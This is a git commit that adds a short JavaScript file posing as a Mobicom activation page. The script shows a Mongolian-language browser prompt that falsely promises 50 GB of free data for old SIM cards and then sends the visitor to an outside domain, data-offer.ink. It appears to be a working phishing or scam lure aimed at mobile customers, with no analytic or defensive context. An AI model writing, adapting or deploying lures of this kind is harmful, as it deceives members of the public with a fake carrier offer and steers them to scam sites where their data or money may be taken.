de9c024b90bcf5b77f294cc4657e309536671b19
katemj25 <mbokofficial1@gmail.com>
2025-06-06 04:10:33 -0700

    Create activate-mobicomoffer.com.js

---
+++ activate-mobicomoffer.com.js
@@ -0,0 +1,5 @@
+var password = '50 ГБ үнэгүй өгөгдөл'
+password=prompt('SMS: Баяр хүргэе Та Мобикомын 2G, 3G, 4G ХУУЧИН СИМ КАРТЫН 50 ГБ үнэгүй дата авах эрхтэй болсон тул ОК дарж ИДЭВХҮҮЛЭЭРЭЙ.. ','50 ГБ үнэгүй өгөгдөл');
+if (password != '50 ГБ үнэгүй өгөгдөл') {
+location.href='https://data-offer.ink/activate-mobicomoffer.com.html';
+}
